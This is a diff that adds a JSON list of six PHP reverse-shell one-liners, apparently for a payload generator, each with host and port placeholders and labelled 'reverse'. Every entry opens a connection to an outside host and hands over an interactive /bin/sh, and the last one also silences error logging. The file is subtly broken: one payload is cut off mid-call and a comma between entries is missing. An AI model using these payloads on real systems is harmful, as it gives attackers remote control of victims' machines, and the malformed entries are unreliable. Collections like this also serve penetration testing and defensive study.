@@ -1,0 +1,44 @@
+[
+  {
+    "type": "php",
+    "direction": "reverse",
+    "payload": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "note": null,
+    "id": "php1"
+  },
+  {
+    "type": "php",
+    "direction": "reverse",
+    "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open(\"/bin/sh -i\", array(0=>$s, 1=>$s, 2=>$s)",
+    "note": null,
+    "id": "php2"
+  }
+  {
+    "type": "php",
+    "direction": "reverse",
+    "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "note": null,
+    "id": "php3"
+  },
+  {
+    "type": "php",
+    "direction": "reverse",
+    "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "note": null,
+    "id": "php4"
+  },
+  {
+    "type": "php",
+    "direction": "reverse",
+    "payload": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'",
+    "note": null,
+    "id": "php5"
+  },
+  {
+    "type": "php",
+    "direction": "reverse",
+    "payload": "php -r '$s='127.0.0.1';$p=443;@error_reporting(0);@ini_set(\"error_log\",NULL);@ini_set(\"log_errors\",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open('/bin/sh$IFS-i',array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die('connection/closed');if(feof($p[1]))die('shell/not/response');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die(\"proc_open/disabled\");}}else{die(\"not/connect\");}'",
+    "note": null,
+    "id": "php6"
+  }
+]
